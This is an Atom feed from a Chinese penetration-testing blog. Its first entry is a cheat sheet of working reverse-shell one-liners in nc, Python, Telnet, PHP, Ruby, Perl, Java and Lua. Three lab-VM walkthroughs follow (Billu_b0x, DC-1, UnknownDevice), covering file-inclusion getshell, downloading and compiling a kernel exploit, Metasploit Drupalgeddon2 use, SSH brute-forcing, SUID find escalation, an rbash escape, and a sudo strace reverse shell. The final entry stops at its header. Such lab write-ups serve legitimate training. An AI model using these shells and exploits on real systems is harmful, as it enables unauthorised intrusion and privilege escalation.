<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>不如茶酒伴</title>
  
  <subtitle>你看，那个人好奇怪哦！是啊，好像一条狗！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0xp1n3.github.io/"/>
  <updated>2019-03-27T15:06:40.025Z</updated>
  <id>https://0xp1n3.github.io/</id>
  
  <author>
    <name>p1n3</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux花式弹shell指南</title>
    <link href="https://0xp1n3.github.io/2019/03/26/reverse-shell/"/>
    <id>https://0xp1n3.github.io/2019/03/26/reverse-shell/</id>
    <published>2019-03-26T23:58:40.000Z</published>
    <updated>2019-03-27T15:06:40.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><a id="more"></a><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure></blockquote><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.239.131",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line"></span><br><span class="line">nc -lvvp 6666 <span class="comment">#命令传输窗口</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#命令结果显示窗口</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod <span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.131 6666 0&lt;<span class="built_in">test</span> | /bin/bash 1&gt;<span class="built_in">test</span></span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.220.131",6666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></blockquote><blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.220.131'</span>, <span class="number">6666</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">      <span class="number">0</span> =&gt; $sock,</span><br><span class="line">      <span class="number">1</span> =&gt; $sock,</span><br><span class="line">      <span class="number">2</span> =&gt; $sock</span><br><span class="line"> );</span><br><span class="line"> $process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line"> proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><blockquote><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">*ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("192.168.220.131","6666");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.220.131";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure></blockquote><h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><blockquote><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;nc&quot;&gt;&lt;a href=&quot;#nc&quot; class=&quot;headerlink&quot; title=&quot;nc&quot;&gt;&lt;/a&gt;nc&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战:Billu_b0x靶机入侵</title>
    <link href="https://0xp1n3.github.io/2019/03/26/Billu_b0x/"/>
    <id>https://0xp1n3.github.io/2019/03/26/Billu_b0x/</id>
    <published>2019-03-26T20:46:20.000Z</published>
    <updated>2019-03-27T12:00:25.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote><ul><li>作者:billu</li><li>难度定位:中等</li><li>目标:获得root</li></ul></blockquote><blockquote><ul><li>靶机:192.168.220.130</li><li>攻击机:192.168.220.129</li></ul></blockquote><h2 id="0x02-SQL注入GetShell"><a href="#0x02-SQL注入GetShell" class="headerlink" title="0x02 SQL注入GetShell?"></a>0x02 SQL注入GetShell?</h2><a id="more"></a><p><img src="nmap.PNG" alt=""></p><blockquote><p>port 22<br>port 80</p></blockquote><p><img src="index.PNG" alt=""></p><p>很显然是SQL注入，但事情并没有那么简单<br>先是经过一波手工测试，发现一个奇怪问题，不管是什么参数，都只会返回200和弹窗TryAgain<br><img src="post.PNG" alt=""></p><p>甚至全部置空，也是返回200<br>先后测试过所有可控参数包括cookie，Referer，PHPSESSID<br>最后绝望的拿去sqlmap跑，还调了最高级以及尝试了一些tamper<br>结果就是这样</p><p><img src="sqlmap-rs.PNG" alt=""></p><h2 id="0x03-关键还得跑目录"><a href="#0x03-关键还得跑目录" class="headerlink" title="0x03 关键还得跑目录"></a>0x03 关键还得跑目录</h2><p>我都怀疑SQL注入是个幌子<br>那么，唯一可行的就是跑目录寻找其他漏洞了<br><img src="dir.PNG" alt=""></p><p>还好确实发现一些有问题的地方<br><code>in.php</code>是<code>phpinfo</code><br><code>add.php</code>有文件上传</p><p><img src="upload.PNG" alt=""></p><p><code>test.php</code>像是文件包含</p><p><img src="include.PNG" alt=""><br>还有一些存在目录遍历，不过都是些图片，不存在价值<br><img src="dt.PNG" alt=""></p><h2 id="0x04-假的文件上传-amp-无法绕过的SQL注入"><a href="#0x04-假的文件上传-amp-无法绕过的SQL注入" class="headerlink" title="0x04 假的文件上传&amp;无法绕过的SQL注入"></a>0x04 假的文件上传&amp;无法绕过的SQL注入</h2><p>文件包含处是POST</p><p><img src="include-exp.PNG" alt=""></p><p>账号除root外中有一个账号<code>ica</code><br>那么先来包含一下<code>add.php</code>的源码<br><img src="upload-source.PNG" alt=""></p><p><img src="emoji.jpg" alt=""></p><p>还有这种操作？？？？</p><p><img src="db.PNG" alt=""></p><p>还好，数据库信息GET，但并没有3306</p><blockquote><p>用户名:billu<br>密码: b0x_billu<br>数据库名: ica_lab<br>另外，主页的注入源码也通过包含拿到</p></blockquote><p><img src="sqli.PNG" alt=""></p><p><img src="sqli-analyze.PNG" alt=""></p><p>我在本地搭建了环境，做了许多测试都无法绕过……<br>有看到一些wp是说过滤的是<code>\&#39;</code><br>但我实际测试，过滤的是<code>&#39;</code>，导致无法逃逸引号<br>而别的wp给出的payload我也无法使用，emmm</p><h2 id="0x05-phpmyadmin-amp-文件上传"><a href="#0x05-phpmyadmin-amp-文件上传" class="headerlink" title="0x05 phpmyadmin&amp;文件上传"></a>0x05 phpmyadmin&amp;文件上传</h2><p>柳暗花明又一村，目录跑出了新的东西<code>phpmy</code>这名字一看就有戏</p><p>通过包含得到的用户名密码有了用武之处</p><p><img src="pass.PNG" alt=""></p><p>成功得到登录账户和密码</p><blockquote><p>账户:biLLu<br>密码:hEx_it</p></blockquote><p>顺道尝试mysql写shell和loadfile，可惜权限过低<br>那么利用拿到的信息登录主页来到了<code>panel.php</code></p><p><img src="panel.PNG" alt=""></p><p>有一个增加用户功能，可以<strong>真的</strong>上传文件</p><p>同时利用之前的文件包含拿到源码</p><p><img src="true-upload.PNG" alt=""></p><p>emmmm，没关系，还有show user中还有一处文件包含</p><p>先来上传个马</p><p><img src="reverse.PNG" alt=""></p><h2 id="0x06-文件包含Getshell"><a href="#0x06-文件包含Getshell" class="headerlink" title="0x06 文件包含Getshell"></a>0x06 文件包含Getshell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($choice===<span class="string">'show'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到panel中show user功能源码如上<br>构造一个POST请求</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load=/uploaded_images/reverse.jpg&amp;<span class="built_in">continue</span>=<span class="built_in">continue</span></span><br></pre></td></tr></table></figure><p><img src="nc.PNG" alt=""></p><p>千辛万苦，终于拿到了shell<br>上来先是素质二连，<code>whoami</code> <code>ls</code>毫无回显，刚开始以为是权限问题，结果断连时有回显了，期间检测到有py环境</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></table></figure><p>那么又到了激动人心的提权时刻了</p><p>先是find一波没什么特殊，uname一波，哟吼</p><p><img src="kernel.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.220.131:8001/37292.c -O /tmp/a.c</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc a.c -o pwn</span><br><span class="line">chmod +x pwn</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure><p><img src="root.PNG" alt=""></p><p>看来这个靶机难度是偏向web的…</p><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>先是跑目录得到许多页面信息<br>发现<code>test.php</code>存在文件包含漏洞，通过包含其他页面得到源码，并进行审计<br>包含到c.php得到数据库密码和用户，在phpmyadmin登录找到主页用户密码<br>登录主页，跳到<code>panel.php</code>，有图片上传和展示功能的文件包含<br>通过包含图片马，反弹得shell，通过linux内核提权到root<br>整个过程一环扣一环，少一步就失败</p><blockquote><p>多说一句包含拿shell的是panel.php这个页面，而test.php那个包含用的是readfile函数，是没办法getshell的</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;作者:billu&lt;/li&gt;
&lt;li&gt;难度定位:中等&lt;/li&gt;
&lt;li&gt;目标:获得root&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;靶机:192.168.220.130&lt;/li&gt;
&lt;li&gt;攻击机:192.168.220.129&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x02-SQL注入GetShell&quot;&gt;&lt;a href=&quot;#0x02-SQL注入GetShell&quot; class=&quot;headerlink&quot; title=&quot;0x02 SQL注入GetShell?&quot;&gt;&lt;/a&gt;0x02 SQL注入GetShell?&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战:DC-1靶机入侵</title>
    <link href="https://0xp1n3.github.io/2019/03/23/DC-1/"/>
    <id>https://0xp1n3.github.io/2019/03/23/DC-1/</id>
    <published>2019-03-23T21:30:06.000Z</published>
    <updated>2019-03-28T02:31:43.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-序章"><a href="#0x01-序章" class="headerlink" title="0x01 序章"></a>0x01 序章</h2><ul><li>作者:DCAU</li><li>难度定位:未知，初级?</li><li>目标:共有五个flag，但最终目标是在root的主目录中</li></ul><h2 id="0x02-新玩意"><a href="#0x02-新玩意" class="headerlink" title="0x02 新玩意"></a>0x02 新玩意</h2><a id="more"></a><p>这次来尝试一下<code>新玩意</code>，NetDiscover</p><p>这个发现工具我还是第一次用，虽然听说过很多次</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先指定一下网卡</span></span><br><span class="line">sudo netdiscover -i eth2</span><br></pre></td></tr></table></figure><p><img src="NetDiscover.PNG" alt=""></p><blockquote><ul><li>192.168.135.131</li></ul></blockquote><p>鉴于上次的经验，这次我指定了更全面的扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -p- 192.168.135.131</span><br></pre></td></tr></table></figure><p><img src="Nmap.PNG" alt=""></p><p>先试下admin，<code>Access denied</code>，好吧</p><p>那来跑下目录</p><p>然后…..然后站就被我跑崩了,🤦つ﹏⊂</p><p><img src="error.PNG" alt=""></p><p>重启一下虚拟机，不跑了不跑了，先看看robots吧</p><p><img src="robots.PNG" alt=""></p><p>通过UPGRADE.txt和MAINTAINERS.txt基本可以确认是Drupal 7.x(9 or 10)</p><h2 id="0x03-Drupalgeddon2-GetShell"><a href="#0x03-Drupalgeddon2-GetShell" class="headerlink" title="0x03 Drupalgeddon2 GetShell"></a>0x03 Drupalgeddon2 GetShell</h2><p><img src="drupalgeddon2.PNG" alt=""></p><p>对于Drupal，我找到一个历害的洞，是远程命令执行</p><p><img src="msf.PNG" alt=""></p><p>Msf中也有，但利用并不顺利</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.135.131</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.135.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="msferror.PNG" alt=""></p><p>反而在searchsploit中找到一个基于ruby的可用exp</p><p><img src="searchsploit.PNG" alt=""></p><p>成功拿到了shell，但我不死心再度尝试msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/reverse_php</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>事实证明，能弹回来</p><p>我再次进行一些测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inline</span><br><span class="line">php/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stager</span><br><span class="line">generic/shell_reverse_tcp   Generic Command Shell, Reverse TCP Inline</span><br><span class="line">php/reverse_php             PHP Command Shell, Reverse TCP (via PHP)</span><br></pre></td></tr></table></figure><p>前两者一个是使用命令行回连，一个是使用php回连，php回连能连上但无权限</p><p><img src="meterpreter.PNG" alt=""></p><p>而普通的generic和php都能正常工作，好的，可以说明是meterpreter的锅</p><p>然而体验还不如那个ruby的exp，卒~</p><h2 id="0x04-Flag1-amp-Flag2"><a href="#0x04-Flag1-amp-Flag2" class="headerlink" title="0x04 Flag1&amp;Flag2"></a>0x04 Flag1&amp;Flag2</h2><p>进来web目录下有一个flag1</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DC-1&gt;&gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure><p>很明显的提示，一顿搜索，Drupal的配置文件在<code>sites/default/settings.php</code></p><p><img src="flag2.PNG" alt=""></p><blockquote><p>Getflag2<br>db:drupaldb<br>username:dbuser<br>password:R0ck3t</p></blockquote><p>那我们连上去mysql看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p>然而乱七八糟啥有用的信息都找不到</p><p>期间我又重新弹了一次shell，后来发现<br><img src="kernel.PNG" alt=""></p><p>哇咔咔，你懂的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o2 up.c</span><br></pre></td></tr></table></figure><p>随后</p><p><img src="PyhtonServer.PNG" alt=""></p><p>我在本机搭建了一个简易的python服务器</p><p>并wget拿到exp</p><p><img src="wget.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x 2</span><br><span class="line">./2</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>然后再看一下别的路</p><h2 id="0x05-SSH爆破提权"><a href="#0x05-SSH爆破提权" class="headerlink" title="0x05 SSH爆破提权"></a>0x05 SSH爆破提权</h2><p>这时我又想起了flag2的提示，跑字典.同时passwd中一个账号吸引了我的注意</p><p><img src="flag4hint.PNG" alt=""></p><p>就是它了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[22][ssh] host: 192.168.135.131   login: flag4   password: orange</span><br></pre></td></tr></table></figure><p>橙子，发现home下还有个flag4</p><p><img src="flag4.PNG" alt=""></p><h2 id="0x06-基于find提权"><a href="#0x06-基于find提权" class="headerlink" title="0x06 基于find提权"></a>0x06 基于find提权</h2><blockquote><p>注意：我在发现flag4前就已经通过find拿到root了，为了方便观看我把过程放到了这里，所以有些图片中的终端名对不上了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="find.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p>find中提供了一处命令执行功能</p><p><img src="find2.PNG" alt=""></p><p><img src="thefinalflag.PNG" alt=""></p><h2 id="0x07-Flag3"><a href="#0x07-Flag3" class="headerlink" title="0x07 Flag3"></a>0x07 Flag3</h2><p>虽然已经拿到了root并集齐了四个flag</p><p>但并没有找到flag3，同时想起flag2中将我们引向数据库的目的</p><p>数据库我仔细翻找过，并没有特殊的东西，我们能做的东西不多比如:得到管理员密码</p><p>那有什么用呢，登录后台?</p><p><img src="admin.PNG" alt=""></p><p>如果是一般情况，估计只有跑john了，但这次不一样，我们知道盐</p><p><img src="salt.PNG" alt=""></p><p>啊！还有更省事的方法，drupal自带了了加密</p><p><img src="password-hash.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$S</span><span class="variable">$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p</span>.</span><br></pre></td></tr></table></figure><p>到数据库中</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> pass = <span class="string">'$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.'</span> <span class="keyword">where</span> uid=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="flag3.PNG" alt=""></p><p>看样子我是直接跳过了hint，拿root了emmmmmm</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-序章&quot;&gt;&lt;a href=&quot;#0x01-序章&quot; class=&quot;headerlink&quot; title=&quot;0x01 序章&quot;&gt;&lt;/a&gt;0x01 序章&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;作者:DCAU&lt;/li&gt;
&lt;li&gt;难度定位:未知，初级?&lt;/li&gt;
&lt;li&gt;目标:共有五个flag，但最终目标是在root的主目录中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x02-新玩意&quot;&gt;&lt;a href=&quot;#0x02-新玩意&quot; class=&quot;headerlink&quot; title=&quot;0x02 新玩意&quot;&gt;&lt;/a&gt;0x02 新玩意&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战:UnknownDevice靶机入侵</title>
    <link href="https://0xp1n3.github.io/2019/03/22/UnknownDevice/"/>
    <id>https://0xp1n3.github.io/2019/03/22/UnknownDevice/</id>
    <published>2019-03-23T00:52:20.000Z</published>
    <updated>2019-03-27T11:51:04.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul><li>难度定位:中级</li><li>作者：Ajay Verma</li><li>目标:获得root并阅读/root/flag.txt</li></ul><a id="more"></a><h2 id="0x02-主机扫描"><a href="#0x02-主机扫描" class="headerlink" title="0x02 主机扫描"></a>0x02 主机扫描</h2><p>先扫一波</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.135.129</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title:    Website By Unknowndevice64   </span><br><span class="line">MAC Address: 00:0C:29:F9:6F:F5 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><blockquote><p>port 31337 python的简易HTTPServer</p></blockquote><p><img src="31337.png" alt=""></p><p><img src="hint.png" alt=""></p><p>代码有hint</p><h2 id="0x03-图片隐写术"><a href="#0x03-图片隐写术" class="headerlink" title="0x03 图片隐写术"></a>0x03 图片隐写术</h2><p><img src="hidden.png" alt=""></p><p>是图片隐写，先后拿HxD和Stegsolve分析过，都不行</p><p>看了wp才知道要用steghide，出师不利</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide --extract -sf key_is_h1dd3n.jpg</span><br></pre></td></tr></table></figure><p>密码是h1dd3n</p><p>得到一串奇怪的东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------.</span><br></pre></td></tr></table></figure><p>看着这串，倒是想到了以前接触过的jsfuck，但其实又不一样</p><p>查了些资料感觉可能是BrainFuck</p><p><img src="brainfuck.png" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64:1M!<span class="comment">#64@ud</span></span><br></pre></td></tr></table></figure><p>还以为是啥加密，折腾许久，再次走投无路….偶然间发现，这名字emmm</p><p><img src="ud64.png" alt=""></p><p>这是用户名+密码?可是没有可以登录的地方啊，端口只有<code>31337</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p 1-65535 192.168.135.129</span><br></pre></td></tr></table></figure><p>指定全端口，再扫一次，1337有SSH，看来就是它了</p><p><img src="ssh.png" alt=""></p><p>进来了??殊不知真正的挑战才刚刚开始</p><h2 id="0x04-rbash限制逃逸"><a href="#0x04-rbash限制逃逸" class="headerlink" title="0x04 rbash限制逃逸"></a>0x04 rbash限制逃逸</h2><p>上来就是ls</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64@unknowndevice64_v1:~$ ls</span><br><span class="line">-rbash: /bin/ls: restricted: cannot specify `/<span class="string">' in command names</span></span><br></pre></td></tr></table></figure><p>先来看看这个rbash是个什么东西</p><p><img src="rbash.png" alt=""></p><p>这么变态???，经过一番搜索</p><p>发现可以通过按两下tab键调出可以执行的程序</p><p><img src="tab.png" alt=""></p><p>最终找到两处可绕过限制shell的方法</p><ul><li>vi 执行!/bin/sh</li><li>export PATH=$PATH:/bin/  export PATH=$PATH:/usr/bin</li></ul><p>但权限受限，环境变量是只读，只有vi了</p><p><img src="shell1.png" alt=""></p><p>很好，目前已经获得了一个’’较’’正常的shell，但是权限依然很低</p><p>事实上这只是在vi中运行的一个’shell’，那么先把它提到普通的shell</p><p>比如这样</p><p><img src="shell2.png" alt=""></p><p>这是因为在vi的shell中已经拥有了环境变量的写入权限了</p><h2 id="0x05-破釜沉舟strace到root"><a href="#0x05-破釜沉舟strace到root" class="headerlink" title="0x05 破釜沉舟strace到root"></a>0x05 破釜沉舟strace到root</h2><p>现在依旧没有办法读到root下的flag</p><p>查看了passwd，除root外，有bash的账户还有一个operator</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0::/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/bin/bash</span><br><span class="line">ud64:x:1000:1000::/home/ud64:/bin/rbash</span><br></pre></td></tr></table></figure><p>但不知道密码，也找不到可行的内核提权</p><p>再度陷入僵局</p><p>最终，在先后检查了环境变量和进程后，在检查sudo可执行命令时发现<br><img src="sysud64.png" alt=""></p><p>可以用sudo执行<code>/usr/bin/sysud64</code>但我并不清楚这是什么程序，幸好有help</p><p>其实这是strace，一个用以诊断，调试的程序，没错调试就意味着运行!</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>以root权限进行一次弹shell并把所有调试输出到最爱的黑洞<br><img src="root.png" alt=""></p><p>事后发现其实可以直接执行/bin/bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash</span><br></pre></td></tr></table></figure><p>我不管，我就是要弹，小声逼逼</p><h2 id="0x06-GetFlag"><a href="#0x06-GetFlag" class="headerlink" title="0x06 GetFlag"></a>0x06 GetFlag</h2><p>A hacker does for love what others woud not do for money.</p><p><img src="flag.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;难度定位:中级&lt;/li&gt;
&lt;li&gt;作者：Ajay Verma&lt;/li&gt;
&lt;li&gt;目标:获得root并阅读/root/flag.txt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透实战" scheme="https://0xp1n3.github.io/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>渗透实战:HackInOS靶机入侵</title>
    <link href="https://0xp1n3.github.io/2019/03/21/HackInOS/"/>
    <id>https://0xp1n3.github.io/2019/03/21/HackInOS/</id>
    <published>2019-03-21T23:10:17.000Z</published>
    <updated>2019-03-27T11:51:38.578Z</updated>
    
